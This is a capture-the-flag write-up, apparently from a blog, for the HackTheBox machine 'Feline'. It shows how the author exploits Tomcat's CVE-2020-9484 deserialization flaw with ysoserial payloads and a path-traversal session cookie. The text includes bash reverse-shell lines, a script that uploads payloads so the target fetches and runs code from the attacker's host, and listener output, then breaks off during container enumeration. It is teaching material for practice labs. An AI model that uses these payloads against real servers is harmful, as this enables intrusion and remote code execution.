@@ -1,0 +1,720 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Feline</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#htb-feline">htb-feline</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#ubuntu">ubuntu</a> <a class="post-tag" href="/tags#upload">upload</a> <a class="post-tag" href="/tags#tomcat">tomcat</a> <a class="post-tag" href="/tags#deserialization">deserialization</a> <a class="post-tag" href="/tags#java">java</a> <a class="post-tag" href="/tags#cve-2020-9484">cve-2020-9484</a> <a class="post-tag" href="/tags#ysoserial">ysoserial</a> <a class="post-tag" href="/tags#docker">docker</a> <a class="post-tag" href="/tags#saltstack">saltstack</a> <a class="post-tag" href="/tags#cve-2020-11651">cve-2020-11651</a> <a class="post-tag" href="/tags#chisel">chisel</a> <a class="post-tag" href="/tags#docker-sock">docker-sock</a> <a class="post-tag" href="/tags#container">container</a> <a class="post-tag" href="/tags#socat">socat</a> <a class="post-tag" href="/tags#htb-fatty">htb-fatty</a> <a class="post-tag" href="/tags#htb-arkham">htb-arkham</a> </span><br/><br/>
+<time class="dt-published" datetime="2021-02-20T14:45:00+00:00" itemprop="datePublished">Feb 20, 2021
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2021/02/20/htb-feline.html" style="color: #e6e6e6; text-decoration: none;">HTB: Feline</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/feline-cover.webp" type="image/webp"/>
+<img alt="Feline" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/feline-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:120px;">
+</img></picture>
+<p>Feline was another Tomcat box, this time exploiting a neat CVE that allowed me to upload a malcious serialized payload and then trigger it by giving a cookie that points the session to that file. The rest of the box focuses on Salt Stack, an IT automation platform. My foothold shell is on the main host, but Salt is running in a container. I’ll exploit another CVE to get a shell in the Salt container, and then exploit that containers access to the docker socket to get root on the host. In Beyond Root, I’ll show an alternative way of interacting with the docker socket by uploading the docker binary, and I’ll look at the permissions on that socket and how it’s shared into the container.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/274 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/feline" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Feline</a> <a href="https://hackthebox.com/machines/feline" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-feline.webp" type="image/webp"/> <img alt="Feline" class="img-av" src="/icons/box-feline.png"/></picture></a><br/><a href="https://hackthebox.com/machines/feline" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1299015092546174977">29 Aug 2020</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">20 Feb 2021</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Hard">Hard [40]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/feline-diff.webp" type="image/webp"/><img alt="Rated difficulty for Feline" src="/img/feline-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/feline-radar.webp" type="image/webp"/><img alt="Radar chart for Feline" src="/img/feline-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">00:44:52</span><a href="https://app.hackthebox.com/users/139466" rel="noopener" target="_blank"><img alt="szymex73" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/139466" style="display: unset"/><span class="user-text" style="display: none"> szymex73</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">02:08:18</span><a href="https://app.hackthebox.com/users/52045" rel="noopener" target="_blank"><img alt="InfoSecJack" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/52045" style="display: unset"/><span class="user-text" style="display: none"> InfoSecJack</span></a><br/></td>
+</tr>
+<tr>
+<td>Creators</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/8308" rel="noopener" target="_blank"><img alt="MinatoTW" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/8308" style="display: unset"/><span class="user-text" style="display: none"> MinatoTW</span></a><br/> <a href="https://app.hackthebox.com/users/13531" rel="noopener" target="_blank"><img alt="MrR3boot" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/13531" style="display: unset"/><span class="user-text" style="display: none"> MrR3boot</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> found two open TCP ports, SSH (22) and HTTP (8080):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 10.10.10.205
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-31 21:48 EDT
+Nmap scan report for 10.10.10.205
+Host is up (0.017s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 8.63 seconds
+
+</span><span class="gp">root@kali#</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,8080 <span class="nt">-sC</span> <span class="nt">-sV</span> 10.10.10.205
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-31 21:49 EDT
+Nmap scan report for 10.10.10.205
+Host is up (0.014s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+8080/tcp open  http    Apache Tomcat 9.0.27
+|_http-title: VirusBucket
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.33 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="https://packages.ubuntu.com/search?keywords=openssh-server">OpenSSH version</a>, the host is likely running Ubuntu Focal 20.04.</p>
+<p>The HTTP server on 8080 is Apache Tomcat version 9.0.27.</p>
+<h3 id="website---tcp-8080">Website - TCP 8080</h3>
+<p>The site is VirusBucket, what appears to be a <a href="https://www.virustotal.com/gui/home/search">VirusTotal</a> knock-off:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200831215121528.webp" type="image/webp"/>
+<img alt="image-20200831215121528" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200831215121528.png"/>
+</picture>
+<p>All of the links point to this homepage, except for Service, which presents an upload form:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200831215233684.webp" type="image/webp"/>
+<img alt="image-20200831215233684" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200831215233684.png"/>
+</picture>
+<p>I can enter an email and clicking sample brings up the file selector. When I hit “Analyze!”, the page doesn’t refresh, but a message shows up below the button:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200831215606133.webp" type="image/webp"/>
+<img alt="image-20200831215606133" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200831215606133.png"/>
+</picture>
+<p><code class="language-plaintext highlighter-rouge">gobuster</code> didn’t return anything other than <code class="language-plaintext highlighter-rouge">/images</code> and <code class="language-plaintext highlighter-rouge">/service</code> (which is the upload form above).</p>
+<h2 id="shell-as-tomcat">Shell as tomcat</h2>
+<h3 id="uploads">Uploads</h3>
+<p>I spent a while trying to upload files to the site in the hopes that they might be run. I started with a Bash script that would call a reverse shell, then an ELF from <code class="language-plaintext highlighter-rouge">msfvenom</code>, a Python script, etc. Eventually I decided that my payload didn’t seem to be being run.</p>
+<p>Submitting the file sends an HTTP POST request with the email as a GET parameter and the file as a form field in the POST:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/upload.jsp?email=0xdf@0xdf.htb</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.10.205:8080</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://10.10.10.205:8080/service/</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">multipart/form-data; boundary=---------------------------196356314313815341281577268423</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://10.10.10.205:8080</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">290</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">JSESSIONID=11DB6C0E281EEC29EC6B0B3A50EEE9C3</span>
+
+-----------------------------196356314313815341281577268423
+Content-Disposition: form-data; name="image"; filename="shell.sh"
+Content-Type: application/x-shellscript
+
+#!/bin/bash
+
+bash -i &gt;&amp; /dev/tcp/10.10.14.15/443 0&gt;&amp;1
+
+-----------------------------196356314313815341281577268423--
+</code></pre></div></div>
+<p>Beside the content of the file, I control the email address (which is passed as a GET parameter even in this POST request) and the filename.</p>
+<p>On sending the request to Burp Repeater, bad characters (like <code class="language-plaintext highlighter-rouge">"</code>) in the email address returns an HTTP 400 Bad Request. At the end of the HTML is this:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">&lt;pre&gt;java.lang.IllegalArgumentException: Invalid character found in the request target. The valid characters are defined in RFC 7230 and RFC 3986
+    org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:468)
+    org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:292)
+    org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)
+    org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:861)
+    org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1579)
+    org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+    java.base&amp;#47;java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
+    java.base&amp;#47;java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
+    org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+    java.base&amp;#47;java.lang.Thread.run(Thread.java:834)
+&lt;/pre&gt;
+&lt;p&gt;&lt;b&gt;Note&lt;/b&gt; The full stack trace of the root cause is available in the server logs.&lt;/p&gt;&lt;hr class="line" /&gt;
+&lt;h3&gt;Apache Tomcat/9.0.27&lt;/h3&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</span></code></pre></div></div>
+<p>It the bottom matches the version <code class="language-plaintext highlighter-rouge">nmap</code> returned.</p>
+<p>Another thing that was useful was submitting with an empty filename:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20200831220455176.png"><img alt="image-20200831220455176" src="https://0xdfimages.gitlab.io/img/image-20200831220455176.png"/><em>Click for full size image</em></a></p>
+<p>It looks like the server is taking that name and prepending <code class="language-plaintext highlighter-rouge">/opt/samples/uploads</code> to it to create a filename, and when it’s blank, it can’t write a file where the directory already exists, so it throws an error.</p>
+<p>I tried seeing if I could write up a directory with <code class="language-plaintext highlighter-rouge">../test</code>, but it returned an error message, <code class="language-plaintext highlighter-rouge">Invalid filename!</code>, which suggests some kind of filtering is going on. Quick tests show a bad character list that includes <code class="language-plaintext highlighter-rouge">/</code>, <code class="language-plaintext highlighter-rouge">-</code>, <code class="language-plaintext highlighter-rouge">|</code>, and a bunch of other special characters.</p>
+<h3 id="tomcat-patch-logs">Tomcat Patch Logs</h3>
+<p>The <a href="https://tomcat.apache.org/security-9.html">Tomcat patched vulnerabilities list</a> shows the first security fix after 9.0.27 is in 9.0.29, which was released in November 2019. There have been seven updates that included a security fix since the version on Feline. Looking through all of those, I ignored the local bugs and the denial of service (DOS) bugs, leaving me to focus on three:</p>
+<ul>
+<li><strong>Moderate: Local Privilege Escalation</strong> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12418">CVE-2019-12418</a></li>
+<li><strong>Important: AJP Request Injection and potential Remote Code Execution</strong> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938">CVE-2020-1938</a></li>
+<li><strong>Remote Code Execution via session persistence</strong> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9484">CVE-2020-9484</a></li>
+</ul>
+<p>The first one is local, but there’s another bug, <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-2684">CVE-2019-2684</a> which allows it to be run remotely. Still, given that it’s a privesc, it seems unlikely to be the entry point to this box.</p>
+<p>The second one, <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938">CVE-2020-1938</a>, is focused on an exposed port for Apache JServ Protocol (AJP), which I haven’t seen here.</p>
+<p>The last one is interesting.</p>
+<h3 id="cve-2020-9484">CVE-2020-9484</h3>
+<h4 id="background">Background</h4>
+<p>CVE-2020-9484 is a <a href="https://www.redtimmy.com/java-hacking/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/">deserialization vulnerability</a> combined with a bit of a directory traversal in Apache Tomcat’s session handling. I covered this exploit in last year’s <a href="/hackvent2020/leet#hv2021">Hackvent Day 21 write-up</a>. Basically, when an HTTP request includes a <code class="language-plaintext highlighter-rouge">JSESSIONID</code> cookie, before this patch, the server would look for <code class="language-plaintext highlighter-rouge">[cookie].session</code> in the sessions folder (in this case <code class="language-plaintext highlighter-rouge">/opt/tomcat/session</code>, though it’s not important to know that to perform this attack). If I set the cookie to be <code class="language-plaintext highlighter-rouge">../../../../0xdf</code>, it will end up looking for <code class="language-plaintext highlighter-rouge">/0xdf.session</code> in the system root.</p>
+<p>What’s inside the session file is a serialized Java object representing the state of the session.</p>
+<p>If I can upload a malicious serialized payload, and then reference it with the session cookie, the server will deserialize the payload and provide RCE.</p>
+<h4 id="payload--poc">Payload / POC</h4>
+<p>I’ve used <a href="https://github.com/frohoff/ysoserial">YSoSerial</a> before (see <a href="/2020/08/08/htb-fatty.html#ysoserial">Fatty</a> and <a href="/2019/08/10/htb-arkham.html#jsf-deserialization-background">Arkham</a>) to create malicious Java serialized payloads. I’ll use that here. It has a bunch of different payload options. What works will depend on how the target is configured. I’ve found it’s always best to start with <code class="language-plaintext highlighter-rouge">CommonsCollections</code> (there are five them).</p>
+<p>I’ll start with a simple <code class="language-plaintext highlighter-rouge">ping</code> to myself to see if I can get RCE.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>java <span class="nt">-jar</span> /opt/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections1 <span class="s1">'ping -c 1 10.10.14.15'</span> <span class="o">&gt;</span> ping.session
+</code></pre></div></div>
+<p>Now I’ll upload that through the site, and, with <code class="language-plaintext highlighter-rouge">tcpdump</code> listening, send the attack:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl <span class="nt">-s</span> http://10.10.10.205:8080/ <span class="nt">-H</span> <span class="s2">"Cookie: JSESSIONID=../../../../../opt/samples/uploads/ping"</span>
+<span class="gp">&lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 500 – Internal Server Error&lt;/title&gt;&lt;style type="text/css"&gt;h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#</span>525D76<span class="p">;</span>font-size:22px<span class="p">;</span><span class="o">}</span> h2 <span class="o">{</span>font-family:Tahoma,Arial,sans-serif<span class="p">;</span>color:white<span class="p">;</span>background-color:#525D76<span class="p">;</span>font-size:16px<span class="p">;</span><span class="o">}</span> h3 <span class="o">{</span>font-family:Tahoma,Arial,sans-serif<span class="p">;</span>color:white<span class="p">;</span>background-color:#525D76<span class="p">;</span>font-size:14px<span class="p">;</span><span class="o">}</span> body <span class="o">{</span>font-family:Tahoma,Arial,sans-serif<span class="p">;</span>color:black<span class="p">;</span>background-color:white<span class="p">;</span><span class="o">}</span> b <span class="o">{</span>font-family:Tahoma,Arial,sans-serif<span class="p">;</span>color:white<span class="p">;</span>background-color:#525D76<span class="p">;</span><span class="o">}</span> p <span class="o">{</span>font-family:Tahoma,Arial,sans-serif<span class="p">;</span>background:white<span class="p">;</span>color:black<span class="p">;</span>font-size:12px<span class="p">;</span><span class="o">}</span> a <span class="o">{</span>color:black<span class="p">;</span><span class="o">}</span> a.name <span class="o">{</span>color:black<span class="p">;</span><span class="o">}</span> .line <span class="o">{</span>height:1px<span class="p">;</span>background-color:#525D76<span class="p">;</span>border:none<span class="p">;</span><span class="o">}</span>&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 500 – Internal Server Error&lt;/h1&gt;&lt;hr <span class="nv">class</span><span class="o">=</span><span class="s2">"line"</span> /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Exception Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; java.lang.Override missing element entrySet&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server encountered an unexpected condition that prevented it from fulfilling the request.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Exception&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;java.lang.annotation.IncompleteAnnotationException: java.lang.Override missing element entrySet
+<span class="gp">        java.base&amp;#</span>47<span class="p">;</span>sun.reflect.annotation.AnnotationInvocationHandler.invoke<span class="o">(</span>AnnotationInvocationHandler.java:83<span class="o">)</span>
+<span class="go">        com.sun.proxy.$Proxy5.entrySet(Unknown Source)
+...[snip]...
+</span></code></pre></div></div>
+<p>It crashes, but I don’t get a ping. The crash is expected. The payload won’t have the data the program expects, and will make it crash. But not getting a ping means the payload didn’t work.</p>
+<p>I’ll repeat the process with <code class="language-plaintext highlighter-rouge">CommonsCollections2</code>, and I do get a ping:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>tcpdump <span class="nt">-i</span> tun0 icmp
+<span class="go">tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
+09:46:24.215875 IP 10.10.10.205 &gt; 10.10.14.15: ICMP echo request, id 1, seq 1, length 64
+09:46:24.215931 IP 10.10.14.15 &gt; 10.10.10.205: ICMP echo reply, id 1, seq 1, length 64
+</span></code></pre></div></div>
+<p>I have RCE, and know a payload that works.</p>
+<h4 id="shell">Shell</h4>
+<p>To get a shell, I needed to do a bit more playing. It didn’t work with any commands that had redirection (like <code class="language-plaintext highlighter-rouge">|</code> or <code class="language-plaintext highlighter-rouge">&gt;</code>) or stacking commands with <code class="language-plaintext highlighter-rouge">;</code>. So I went to the three step approach. I created a simple shell payload Bash script:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.15/443 0&gt;&amp;1
+</code></pre></div></div>
+<p>Now I’ll send three payloads. The first will use <code class="language-plaintext highlighter-rouge">curl</code> to fetch that shell and write it to <code class="language-plaintext highlighter-rouge">/tmp</code>. The next will <code class="language-plaintext highlighter-rouge">chmod</code> it to make it executable. The third will run it. Because I ended up doing this a handful of times, I wrote a dummy Bash script to do it for me.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nv">ip</span><span class="o">=</span><span class="si">$(</span>ip addr | <span class="nb">grep</span> <span class="s2">"inet 10.10"</span> | <span class="nb">awk</span> <span class="s1">'{print $2}'</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">'/'</span> <span class="nt">-f1</span><span class="si">)</span>
+<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"#!/bin/bash</span><span class="se">\n\n</span><span class="s2">bash -i &gt;&amp; /dev/tcp/</span><span class="k">${</span><span class="nv">ip</span><span class="k">}</span><span class="s2">/443 0&gt;&amp;1"</span> <span class="o">&gt;</span> payload.sh
+
+java <span class="nt">-jar</span> /opt/ysoserial/ysoserial-master.jar CommonsCollections2 <span class="s2">"curl </span><span class="k">${</span><span class="nv">ip</span><span class="k">}</span><span class="s2">/payload.sh -o /tmp/.0xdf"</span> <span class="o">&gt;</span> payload.session
+curl <span class="nt">-s</span> <span class="s1">'http://10.10.10.205:8080/upload.jsp?email=abcd'</span> <span class="nt">-F</span> <span class="s1">'image=@./payload.session'</span> <span class="nt">-x</span> http://127.0.0.1:8080 <span class="o">&gt;</span> /dev/null
+curl <span class="nt">-s</span> http://10.10.10.205:8080/service/ <span class="nt">-H</span> <span class="s2">"Cookie: JSESSIONID=../../../../../../opt/samples/uploads/payload"</span> <span class="o">&gt;</span> /dev/null
+
+java <span class="nt">-jar</span> /opt/ysoserial/ysoserial-master.jar CommonsCollections2 <span class="s1">'chmod +x /tmp/.0xdf'</span> <span class="o">&gt;</span> payload.session                
+curl <span class="nt">-s</span> <span class="s1">'http://10.10.10.205:8080/upload.jsp?email=abcd'</span> <span class="nt">-F</span> <span class="s1">'image=@./payload.session'</span> <span class="nt">-x</span> http://127.0.0.1:8080 <span class="o">&gt;</span> /dev/null
+curl <span class="nt">-s</span> http://10.10.10.205:8080/service/ <span class="nt">-H</span> <span class="s2">"Cookie: JSESSIONID=../../../../../../opt/samples/uploads/payload"</span> <span class="o">&gt;</span> /dev/null
+
+java <span class="nt">-jar</span> /opt/ysoserial/ysoserial-master.jar CommonsCollections2 <span class="s1">'/tmp/.0xdf'</span> <span class="o">&gt;</span> payload.session                         
+curl <span class="nt">-s</span> <span class="s1">'http://10.10.10.205:8080/upload.jsp?email=abcd'</span> <span class="nt">-F</span> <span class="s1">'image=@./payload.session'</span> <span class="nt">-x</span> http://127.0.0.1:8080 <span class="o">&gt;</span> /dev/null
+curl <span class="nt">-s</span> http://10.10.10.205:8080/service/ <span class="nt">-H</span> <span class="s2">"Cookie: JSESSIONID=../../../../../../opt/samples/uploads/payload"</span> <span class="o">&gt;</span> /dev/null   
+</code></pre></div></div>
+<p>I’ll start <code class="language-plaintext highlighter-rouge">python3 -m http.server 80</code> in the directory with <code class="language-plaintext highlighter-rouge">shell.sh</code>, and a <code class="language-plaintext highlighter-rouge">nc</code> listener on port 443, then run the above Bash script. First I see the hit on my webserver:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>python3 <span class="nt">-m</span> http.server 80
+<span class="go">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.205 - - [31/Aug/2020 16:45:16] "GET /payload.sh HTTP/1.1" 200 -  
+</span></code></pre></div></div>
+<p>Then there’s a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.205.
+Ncat: Connection from 10.10.10.205:42124.
+bash: cannot set terminal process group (944): Inappropriate ioctl for device
+bash: no job control in this shell
+tomcat@VirusBucket:/opt/tomcat$
+</span></code></pre></div></div>
+<p>I’ll use <code class="language-plaintext highlighter-rouge">python -c 'import pty;pty.spawn("bash")'</code> then Ctrl-z, <code class="language-plaintext highlighter-rouge">stty raw -echo; fg</code>, <code class="language-plaintext highlighter-rouge">reset</code> to get a better shell, and then grab <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">tomcat@VirusBucket:~$</span><span class="w"> </span>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("bash")'</span>
+<span class="go">python3 -c 'import pty;pty.spawn("bash")'
+</span><span class="gp">tomcat@VirusBucket:~$</span><span class="w"> </span>^Z
+<span class="go">[1]+  Stopped                 sudo nc -lnvp 443
+</span><span class="gp">root@kali$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+<span class="go">sudo nc -lnvp 443
+                 reset
+reset: unknown terminal type unknown
+Terminal type? screen
+</span><span class="gp">tomcat@VirusBucket:~$</span><span class="w"> 
+</span><span class="gp">tomcat@VirusBucket:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">1f07a492************************
+</span></code></pre></div></div>
+<h2 id="shell-as-root-in-container">Shell as root in container</h2>
+<h3 id="enumeration">Enumeration</h3>
+<p>Looking around the box, the home directory was basically empty. The box also limited the process list to processes that were being run by the current user, so there wasn’t much there. What got me going in the right direction was looking at the <code class="language-plaintext highlighter-rouge">netstat</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">tomcat@VirusBucket:~$</span><span class="w"> </span>netstat <span class="nt">-tnl</span> 
+<span class="go">Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 127.0.0.1:35217         0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:4505          0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:4506          0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN     
+tcp6       0      0 :::22                   :::*                    LISTEN     
+tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN     
+tcp6       0      0 :::8080                 :::*                    LISTEN
+</span></code></pre></div></div>
+<p>There were several ports listening on localhost only. Ports 4505 and 4506 are associated with <a href="https://www.saltstack.com/">SaltStack</a>, an infrastructure automation platform.</p>
+<p>I also noted that this box has multiple interfaces, including a <code class="language-plaintext highlighter-rouge">docker0</code>, which in HTB indicates containers:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">tomcat@VirusBucket:~$</span><span class="w"> </span>ifconfig                     
+<span class="go">br-e9220f64857c: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
+        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
+        ether 02:42:cb:c9:0f:ce  txqueuelen 0  (Ethernet) 
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+docker0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
+        inet6 fe80::42:75ff:fea3:764d  prefixlen 64  scopeid 0x20&lt;link&gt;
+        ether 02:42:75:a3:76:4d  txqueuelen 0  (Ethernet) 
+        RX packets 5354  bytes 822803 (822.8 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 9339  bytes 635261 (635.2 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+ens160: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 10.10.10.205  netmask 255.255.255.0  broadcast 10.10.10.255
+        inet6 fe80::250:56ff:feb9:5e24  prefixlen 64  scopeid 0x20&lt;link&gt;
+        inet6 dead:beef::250:56ff:feb9:5e24  prefixlen 64  scopeid 0x0&lt;global&gt;
+        ether 00:50:56:b9:5e:24  txqueuelen 1000  (Ethernet)
